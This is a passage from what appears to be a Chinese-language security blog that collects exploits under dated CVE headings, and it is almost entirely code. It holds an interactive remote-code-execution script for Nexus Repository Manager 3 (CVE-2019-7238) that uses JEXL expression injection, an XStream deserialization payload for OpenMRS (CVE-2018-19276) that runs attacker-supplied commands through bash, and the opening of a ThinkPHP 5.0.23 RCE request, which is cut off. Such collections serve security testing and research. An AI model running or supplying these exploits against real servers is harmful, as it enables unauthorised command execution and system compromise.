class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">"KO"</span>)</span><br><span class="line">                os.killpg(os.getpgid(pro.pid), signal.SIGTERM)</span><br><span class="line">                sys.exit()</span><br><span class="line">            os.killpg(os.getpgid(pro.pid), signal.SIGTERM)</span><br><span class="line">            time.sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">            print(<span class="string">"Exiting..."</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><hr><h6 id="2019-02-18-Atlassian-Confluence-路径穿越与命令执行漏洞-CVE-2019-3396"><a href="#2019-02-18-Atlassian-Confluence-路径穿越与命令执行漏洞-CVE-2019-3396" class="headerlink" title="2019-02-18 Atlassian Confluence 路径穿越与命令执行漏洞(CVE-2019-3396)"></a>2019-02-18 Atlassian Confluence 路径穿越与命令执行漏洞(CVE-2019-3396)</h6><h6 id="2019-02-14-Nexus-Repository任意命令执行漏洞-CVE-2019-7238"><a href="#2019-02-14-Nexus-Repository任意命令执行漏洞-CVE-2019-7238" class="headerlink" title="2019-02-14 Nexus Repository任意命令执行漏洞(CVE-2019-7238)"></a>2019-02-14 Nexus Repository任意命令执行漏洞(CVE-2019-7238)</h6><hr><p><img src="../do/images/vulnerability/CVE-2019-7238.png" alt></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests.packages.urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">print(<span class="string">"\nNexus Repository Manager 3 Remote Code Execution - CVE-2019-7238 \nFound by @Rico and @voidfyoo\n"</span>)</span><br><span class="line"></span><br><span class="line">proxy = &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">remote = <span class="string">'http://127.0.0.1:8081'</span></span><br><span class="line"></span><br><span class="line">ARCH=<span class="string">"LINUX"</span></span><br><span class="line"><span class="comment"># ARCH="WIN"</span></span><br><span class="line"></span><br><span class="line">requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkSuccess</span><span class="params">(r)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">        json_data = json.loads(r.text)</span><br><span class="line">        <span class="keyword">if</span> json_data[<span class="string">'result'</span>][<span class="string">'total'</span>] &gt; <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">"OK"</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"KO"</span>)</span><br><span class="line">            sys.exit()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"[-] Error status code"</span>, r.status_code)</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(<span class="string">"[+] Checking if Content-Selectors exist =&gt;"</span>, end=<span class="string">' '</span>)</span><br><span class="line">burp0_url = remote + <span class="string">"/service/extdirect"</span></span><br><span class="line">burp0_headers = &#123;<span class="string">"Content-Type"</span>: <span class="string">"application/json"</span>&#125;</span><br><span class="line">burp0_json = &#123;<span class="string">"action"</span>: <span class="string">"coreui_Component"</span>, <span class="string">"data"</span>: [&#123;<span class="string">"filter"</span>: [&#123;<span class="string">"property"</span>: <span class="string">"repositoryName"</span>, <span class="string">"value"</span>: <span class="string">"*"</span>&#125;, &#123;<span class="string">"property"</span>: <span class="string">"expression"</span>, <span class="string">"value"</span>: <span class="string">"1==1"</span>&#125;, &#123;</span><br><span class="line">    <span class="string">"property"</span>: <span class="string">"type"</span>, <span class="string">"value"</span>: <span class="string">"jexl"</span>&#125;], <span class="string">"limit"</span>: <span class="number">50</span>, <span class="string">"page"</span>: <span class="number">1</span>, <span class="string">"sort"</span>: [&#123;<span class="string">"direction"</span>: <span class="string">"ASC"</span>, <span class="string">"property"</span>: <span class="string">"name"</span>&#125;], <span class="string">"start"</span>: <span class="number">0</span>&#125;], <span class="string">"method"</span>: <span class="string">"previewAssets"</span>, <span class="string">"tid"</span>: <span class="number">18</span>, <span class="string">"type"</span>: <span class="string">"rpc"</span>&#125;</span><br><span class="line">r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json,</span><br><span class="line">              proxies=proxy, verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">checkSuccess(r)</span><br><span class="line">print(<span class="string">""</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> ARCH == <span class="string">"LINUX"</span>:</span><br><span class="line">            command = input(<span class="string">"command (not reflected)&gt; "</span>)</span><br><span class="line">            command = base64.b64encode(command.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">            command_str = command.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">            command_str = command_str.replace(<span class="string">'/'</span>, <span class="string">'+'</span>)</span><br><span class="line"></span><br><span class="line">            print(<span class="string">"[+] Copy file to temp directory =&gt;"</span>, end=<span class="string">' '</span>)</span><br><span class="line"></span><br><span class="line">            burp0_url = remote + <span class="string">"/service/extdirect"</span></span><br><span class="line">            burp0_headers = &#123;<span class="string">"Content-Type"</span>: <span class="string">"application/json"</span>&#125;</span><br><span class="line">            burp0_json = &#123;<span class="string">"action"</span>: <span class="string">"coreui_Component"</span>, <span class="string">"data"</span>: [&#123;<span class="string">"filter"</span>: [&#123;<span class="string">"property"</span>: <span class="string">"repositoryName"</span>, <span class="string">"value"</span>: <span class="string">"*"</span>&#125;, &#123;<span class="string">"property"</span>: <span class="string">"expression"</span>, <span class="string">"value"</span>: <span class="string">"1==0 or ''.class.forName('java.lang.Runtime').getRuntime().exec(\"cp /etc/passwd  /tmp/passwd\")"</span>&#125;, &#123; <span class="string">"property"</span>: <span class="string">"type"</span>, <span class="string">"value"</span>: <span class="string">"jexl"</span>&#125;], <span class="string">"limit"</span>: <span class="number">50</span>, <span class="string">"page"</span>: <span class="number">1</span>, <span class="string">"sort"</span>: [&#123;<span class="string">"direction"</span>: <span class="string">"ASC"</span>, <span class="string">"property"</span>: <span class="string">"name"</span>&#125;], <span class="string">"start"</span>: <span class="number">0</span>&#125;], <span class="string">"method"</span>: <span class="string">"previewAssets"</span>, <span class="string">"tid"</span>: <span class="number">18</span>, <span class="string">"type"</span>: <span class="string">"rpc"</span>&#125;</span><br><span class="line">            r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, proxies=proxy, verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">            checkSuccess(r)</span><br><span class="line"></span><br><span class="line">            print(<span class="string">"[+] Preparing temp file =&gt;"</span>, end=<span class="string">' '</span>)</span><br><span class="line">            burp0_url = remote + <span class="string">"/service/extdirect"</span></span><br><span class="line">            burp0_headers = &#123;<span class="string">"Content-Type"</span>: <span class="string">"application/json"</span>&#125;</span><br><span class="line">            burp0_json = &#123;<span class="string">"action"</span>: <span class="string">"coreui_Component"</span>, <span class="string">"data"</span>: [&#123;<span class="string">"filter"</span>: [&#123;<span class="string">"property"</span>: <span class="string">"repositoryName"</span>, <span class="string">"value"</span>: <span class="string">"*"</span>&#125;, &#123;<span class="string">"property"</span>: <span class="string">"expression"</span>, <span class="string">"value"</span>: <span class="string">"1==0 or ''.class.forName('java.lang.Runtime').getRuntime().exec(\"sed -i 1cpwn2  /tmp/passwd\")"</span>&#125;, &#123;</span><br><span class="line">                <span class="string">"property"</span>: <span class="string">"type"</span>, <span class="string">"value"</span>: <span class="string">"jexl"</span>&#125;], <span class="string">"limit"</span>: <span class="number">50</span>, <span class="string">"page"</span>: <span class="number">1</span>, <span class="string">"sort"</span>: [&#123;<span class="string">"direction"</span>: <span class="string">"ASC"</span>, <span class="string">"property"</span>: <span class="string">"name"</span>&#125;], <span class="string">"start"</span>: <span class="number">0</span>&#125;], <span class="string">"method"</span>: <span class="string">"previewAssets"</span>, <span class="string">"tid"</span>: <span class="number">18</span>, <span class="string">"type"</span>: <span class="string">"rpc"</span>&#125;</span><br><span class="line">            r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, proxies=proxy,</span><br><span class="line">                        verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">            checkSuccess(r)</span><br><span class="line"></span><br><span class="line">            print(<span class="string">"[+] Cleaning temp file =&gt;"</span>, end=<span class="string">' '</span>)</span><br><span class="line">            burp0_url = remote + <span class="string">"/service/extdirect"</span></span><br><span class="line">            burp0_headers = &#123;<span class="string">"Content-Type"</span>: <span class="string">"application/json"</span>&#125;</span><br><span class="line">            burp0_json = &#123;<span class="string">"action"</span>: <span class="string">"coreui_Component"</span>, <span class="string">"data"</span>: [&#123;<span class="string">"filter"</span>: [&#123;<span class="string">"property"</span>: <span class="string">"repositoryName"</span>, <span class="string">"value"</span>: <span class="string">"*"</span>&#125;, &#123;<span class="string">"property"</span>: <span class="string">"expression"</span>, <span class="string">"value"</span>: <span class="string">"1==0 or ''.class.forName('java.lang.Runtime').getRuntime().exec(\"sed -i /[^pwn2]/d /tmp/passwd\")"</span>&#125;, &#123;</span><br><span class="line">                <span class="string">"property"</span>: <span class="string">"type"</span>, <span class="string">"value"</span>: <span class="string">"jexl"</span>&#125;], <span class="string">"limit"</span>: <span class="number">50</span>, <span class="string">"page"</span>: <span class="number">1</span>, <span class="string">"sort"</span>: [&#123;<span class="string">"direction"</span>: <span class="string">"ASC"</span>, <span class="string">"property"</span>: <span class="string">"name"</span>&#125;], <span class="string">"start"</span>: <span class="number">0</span>&#125;], <span class="string">"method"</span>: <span class="string">"previewAssets"</span>, <span class="string">"tid"</span>: <span class="number">18</span>, <span class="string">"type"</span>: <span class="string">"rpc"</span>&#125;</span><br><span class="line">            r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, proxies=proxy,</span><br><span class="line">                            verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">            checkSuccess(r)</span><br><span class="line"></span><br><span class="line">            print(<span class="string">"[+] Writing command into temp file =&gt;"</span>, end=<span class="string">' '</span>)</span><br><span class="line">            burp0_url = remote + <span class="string">"/service/extdirect"</span></span><br><span class="line">            burp0_headers = &#123;<span class="string">"Content-Type"</span>: <span class="string">"application/json"</span>&#125;</span><br><span class="line">            burp0_json = &#123;<span class="string">"action"</span>: <span class="string">"coreui_Component"</span>, <span class="string">"data"</span>: [&#123;<span class="string">"filter"</span>: [&#123;<span class="string">"property"</span>: <span class="string">"repositoryName"</span>, <span class="string">"value"</span>: <span class="string">"*"</span>&#125;, &#123;<span class="string">"property"</span>: <span class="string">"expression"</span>, <span class="string">"value"</span>: <span class="string">"1==0 or ''.class.forName('java.lang.Runtime').getRuntime().exec(\"sed -i 1s/pwn2/&#123;echo,"</span> + command_str + <span class="string">"&#125;|&#123;base64,-d&#125;&gt;pwn.txt/g /tmp/passwd\")"</span>&#125;, &#123;</span><br><span class="line">                <span class="string">"property"</span>: <span class="string">"type"</span>, <span class="string">"value"</span>: <span class="string">"jexl"</span>&#125;], <span class="string">"limit"</span>: <span class="number">50</span>, <span class="string">"page"</span>: <span class="number">1</span>, <span class="string">"sort"</span>: [&#123;<span class="string">"direction"</span>: <span class="string">"ASC"</span>, <span class="string">"property"</span>: <span class="string">"name"</span>&#125;], <span class="string">"start"</span>: <span class="number">0</span>&#125;], <span class="string">"method"</span>: <span class="string">"previewAssets"</span>, <span class="string">"tid"</span>: <span class="number">18</span>, <span class="string">"type"</span>: <span class="string">"rpc"</span>&#125;</span><br><span class="line">            r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, proxies=proxy,</span><br><span class="line">                            verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">            checkSuccess(r)</span><br><span class="line"></span><br><span class="line">            print(<span class="string">"[+] Decode base64 command =&gt;"</span>, end=<span class="string">' '</span>)</span><br><span class="line">            burp0_url = remote + <span class="string">"/service/extdirect"</span></span><br><span class="line">            burp0_headers = &#123;<span class="string">"Content-Type"</span>: <span class="string">"application/json"</span>&#125;</span><br><span class="line">            burp0_json = &#123;<span class="string">"action"</span>: <span class="string">"coreui_Component"</span>, <span class="string">"data"</span>: [&#123;<span class="string">"filter"</span>: [&#123;<span class="string">"property"</span>: <span class="string">"repositoryName"</span>, <span class="string">"value"</span>: <span class="string">"*"</span>&#125;, &#123;<span class="string">"property"</span>: <span class="string">"expression"</span>, <span class="string">"value"</span>: <span class="string">"1==0 or ''.class.forName('java.lang.Runtime').getRuntime().exec(\"bash /tmp/passwd\")"</span>&#125;, &#123;</span><br><span class="line">                <span class="string">"property"</span>: <span class="string">"type"</span>, <span class="string">"value"</span>: <span class="string">"jexl"</span>&#125;], <span class="string">"limit"</span>: <span class="number">50</span>, <span class="string">"page"</span>: <span class="number">1</span>, <span class="string">"sort"</span>: [&#123;<span class="string">"direction"</span>: <span class="string">"ASC"</span>, <span class="string">"property"</span>: <span class="string">"name"</span>&#125;], <span class="string">"start"</span>: <span class="number">0</span>&#125;], <span class="string">"method"</span>: <span class="string">"previewAssets"</span>, <span class="string">"tid"</span>: <span class="number">18</span>, <span class="string">"type"</span>: <span class="string">"rpc"</span>&#125;</span><br><span class="line">            r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, proxies=proxy,</span><br><span class="line">                            verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">            checkSuccess(r)</span><br><span class="line"></span><br><span class="line">            print(<span class="string">"[+] Executing command =&gt;"</span>, end=<span class="string">' '</span>)</span><br><span class="line">            burp0_url = remote + <span class="string">"/service/extdirect"</span></span><br><span class="line">            burp0_headers = &#123;<span class="string">"Content-Type"</span>: <span class="string">"application/json"</span>&#125;</span><br><span class="line">            burp0_json = &#123;<span class="string">"action"</span>: <span class="string">"coreui_Component"</span>, <span class="string">"data"</span>: [&#123;<span class="string">"filter"</span>: [&#123;<span class="string">"property"</span>: <span class="string">"repositoryName"</span>, <span class="string">"value"</span>: <span class="string">"*"</span>&#125;, &#123;<span class="string">"property"</span>: <span class="string">"expression"</span>, <span class="string">"value"</span>: <span class="string">"1==0 or ''.class.forName('java.lang.Runtime').getRuntime().exec(\"bash pwn.txt\")"</span>&#125;, &#123;</span><br><span class="line">                <span class="string">"property"</span>: <span class="string">"type"</span>, <span class="string">"value"</span>: <span class="string">"jexl"</span>&#125;], <span class="string">"limit"</span>: <span class="number">50</span>, <span class="string">"page"</span>: <span class="number">1</span>, <span class="string">"sort"</span>: [&#123;<span class="string">"direction"</span>: <span class="string">"ASC"</span>, <span class="string">"property"</span>: <span class="string">"name"</span>&#125;], <span class="string">"start"</span>: <span class="number">0</span>&#125;], <span class="string">"method"</span>: <span class="string">"previewAssets"</span>, <span class="string">"tid"</span>: <span class="number">18</span>, <span class="string">"type"</span>: <span class="string">"rpc"</span>&#125;</span><br><span class="line">            r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, proxies=proxy,</span><br><span class="line">                            verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">            checkSuccess(r)</span><br><span class="line">            print(<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            command = input(<span class="string">"command (not reflected)&gt; "</span>)</span><br><span class="line">            print(<span class="string">"[+] Executing command =&gt;"</span>, end=<span class="string">' '</span>)</span><br><span class="line">            burp0_url = remote + <span class="string">"/service/extdirect"</span></span><br><span class="line">            burp0_headers = &#123;<span class="string">"Content-Type"</span>: <span class="string">"application/json"</span>&#125;</span><br><span class="line">            burp0_json = &#123;<span class="string">"action"</span>: <span class="string">"coreui_Component"</span>, <span class="string">"data"</span>: [&#123;<span class="string">"filter"</span>: [&#123;<span class="string">"property"</span>: <span class="string">"repositoryName"</span>, <span class="string">"value"</span>: <span class="string">"*"</span>&#125;, &#123;<span class="string">"property"</span>: <span class="string">"expression"</span>, <span class="string">"value"</span>: <span class="string">"1==0 or ''.class.forName('java.lang.Runtime').getRuntime().exec(\""</span> + command + <span class="string">"\")"</span>&#125;, &#123;</span><br><span class="line">                <span class="string">"property"</span>: <span class="string">"type"</span>, <span class="string">"value"</span>: <span class="string">"jexl"</span>&#125;], <span class="string">"limit"</span>: <span class="number">50</span>, <span class="string">"page"</span>: <span class="number">1</span>, <span class="string">"sort"</span>: [&#123;<span class="string">"direction"</span>: <span class="string">"ASC"</span>, <span class="string">"property"</span>: <span class="string">"name"</span>&#125;], <span class="string">"start"</span>: <span class="number">0</span>&#125;], <span class="string">"method"</span>: <span class="string">"previewAssets"</span>, <span class="string">"tid"</span>: <span class="number">18</span>, <span class="string">"type"</span>: <span class="string">"rpc"</span>&#125;</span><br><span class="line">            r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, proxies=proxy,</span><br><span class="line">                              verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">            checkSuccess(r)</span><br><span class="line">            print(<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        print(<span class="string">"Exiting..."</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><hr><h6 id="2019-02-05-OpenMRS-Platform-反序列化漏洞-CVE-2018-19276"><a href="#2019-02-05-OpenMRS-Platform-反序列化漏洞-CVE-2018-19276" class="headerlink" title="2019-02-05 OpenMRS Platform 反序列化漏洞(CVE-2018-19276)"></a>2019-02-05 OpenMRS Platform 反序列化漏洞(CVE-2018-19276)</h6><hr><p><img src="../do/images/vulnerability/CVE-2018-19276.png" alt></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># for java8</span></span><br><span class="line"></span><br><span class="line">remote = <span class="string">"http://127.0.0.1:8888/"</span></span><br><span class="line">ressource = <span class="string">"/openmrs/ws/rest/v1/concept"</span></span><br><span class="line"></span><br><span class="line">proxy = &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    print(<span class="string">"\nCVE-2018-19276 - OpenMRS Insecure Object Deserialization RCE\n"</span>)</span><br><span class="line">    print(<span class="string">"[+] Checking if ressource available =&gt;"</span>, end=<span class="string">' '</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    burp0_url = remote + ressource</span><br><span class="line">    burp0_headers = &#123;<span class="string">"Content-Type"</span>: <span class="string">"application/xml"</span>&#125;</span><br><span class="line">    r = requests.post(burp0_url, headers=burp0_headers, proxies=proxy,</span><br><span class="line">                  verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">500</span>:</span><br><span class="line">        print(<span class="string">"\033[92mOK\033[0m"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"KO, ressource doesn't exist"</span>)</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            command = input(<span class="string">"command (\033[92mnot reflected\033[0m)&gt; "</span>)</span><br><span class="line">            <span class="keyword">if</span> command == <span class="string">"exit"</span>:</span><br><span class="line">                print(<span class="string">"Exiting..."</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            command = base64.b64encode(command.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">            command_str = command.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">            command_str = command_str.replace(<span class="string">'/'</span>, <span class="string">'+'</span>)</span><br><span class="line"></span><br><span class="line">            print(<span class="string">"[+] Executing command =&gt;"</span>, end=<span class="string">' '</span>)</span><br><span class="line">            burp0_url = <span class="string">"http://127.0.0.1:8888/openmrs/ws/rest/v1/concept"</span></span><br><span class="line">            burp0_headers = &#123;<span class="string">"Content-Type"</span>: <span class="string">"text/xml"</span>&#125;</span><br><span class="line">            burp0_data = <span class="string">"&lt;map&gt;\r\n  &lt;entry&gt;\r\n    &lt;jdk.nashorn.internal.objects.NativeString&gt;\r\n      &lt;flags&gt;0&lt;/flags&gt;\r\n      &lt;value class=\"com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data\"&gt;\r\n        &lt;dataHandler&gt;\r\n          &lt;dataSource class=\"com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource\"&gt;\r\n            &lt;is class=\"javax.crypto.CipherInputStream\"&gt;\r\n              &lt;cipher class=\"javax.crypto.NullCipher\"&gt;\r\n                &lt;initialized&gt;false&lt;/initialized&gt;\r\n                &lt;opmode&gt;0&lt;/opmode&gt;\r\n                &lt;serviceIterator class=\"javax.imageio.spi.FilterIterator\"&gt;\r\n                  &lt;iter class=\"javax.imageio.spi.FilterIterator\"&gt;\r\n                    &lt;iter class=\"java.util.Collections$EmptyIterator\"/&gt;\r\n                    &lt;next class=\"java.lang.ProcessBuilder\"&gt;\r\n                      &lt;command&gt;\r\n                        &lt;string&gt;/bin/bash&lt;/string&gt;\r\n                        &lt;string&gt;-c&lt;/string&gt;\r\n  \t\t\t&lt;string&gt;&#123;echo,"</span> + command_str + \</span><br><span class="line">                <span class="string">"&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&lt;/string&gt;\r\n                      &lt;/command&gt;\r\n                      &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;\r\n                    &lt;/next&gt;\r\n                  &lt;/iter&gt;\r\n                  &lt;filter class=\"javax.imageio.ImageIO$ContainsFilter\"&gt;\r\n                    &lt;method&gt;\r\n                      &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;\r\n                      &lt;name&gt;start&lt;/name&gt;\r\n                      &lt;parameter-types/&gt;\r\n                    &lt;/method&gt;\r\n                    &lt;name&gt;foo&lt;/name&gt;\r\n                  &lt;/filter&gt;\r\n                  &lt;next class=\"string\"&gt;foo&lt;/next&gt;\r\n                &lt;/serviceIterator&gt;\r\n                &lt;lock/&gt;\r\n              &lt;/cipher&gt;\r\n              &lt;input class=\"java.lang.ProcessBuilder$NullInputStream\"/&gt;\r\n              &lt;ibuffer&gt;&lt;/ibuffer&gt;\r\n              &lt;done&gt;false&lt;/done&gt;\r\n              &lt;ostart&gt;0&lt;/ostart&gt;\r\n              &lt;ofinish&gt;0&lt;/ofinish&gt;\r\n              &lt;closed&gt;false&lt;/closed&gt;\r\n            &lt;/is&gt;\r\n            &lt;consumed&gt;false&lt;/consumed&gt;\r\n          &lt;/dataSource&gt;\r\n          &lt;transferFlavors/&gt;\r\n        &lt;/dataHandler&gt;\r\n        &lt;dataLen&gt;0&lt;/dataLen&gt;\r\n      &lt;/value&gt;\r\n    &lt;/jdk.nashorn.internal.objects.NativeString&gt;\r\n    &lt;jdk.nashorn.internal.objects.NativeString reference=\"../jdk.nashorn.internal.objects.NativeString\"/&gt;\r\n  &lt;/entry&gt;\r\n  &lt;entry&gt;\r\n    &lt;jdk.nashorn.internal.objects.NativeString reference=\"../../entry/jdk.nashorn.internal.objects.NativeString\"/&gt;\r\n    &lt;jdk.nashorn.internal.objects.NativeString reference=\"../../entry/jdk.nashorn.internal.objects.NativeString\"/&gt;\r\n  &lt;/entry&gt;\r\n&lt;/map&gt;"</span></span><br><span class="line">            r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data, proxies=proxy,</span><br><span class="line">                          verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">            <span class="keyword">if</span> r.status_code == <span class="number">500</span>:</span><br><span class="line">                m = re.search(</span><br><span class="line">                    <span class="string">'(java.util.HashMap)'</span>, r.text)</span><br><span class="line">                <span class="keyword">if</span> m:</span><br><span class="line">                    print(<span class="string">"\033[92mOK\033[0m"</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    print(<span class="string">"KO"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">            print(<span class="string">"Exiting..."</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><hr><h6 id="2019-01-11-ThinkPHP-5-0-23-远程命令执行漏洞"><a href="#2019-01-11-ThinkPHP-5-0-23-远程命令执行漏洞" class="headerlink" title="2019-01-11 ThinkPHP 5.0.23 远程命令执行漏洞"></a>2019-01-11 ThinkPHP 5.0.23 远程命令执行漏洞</h6><hr><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php?s=captcha HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (compatible; MSIE <span class="number">9.0</span>; Windows NT <span class="number">6.1</span>; Win64; x64; Trident/<span 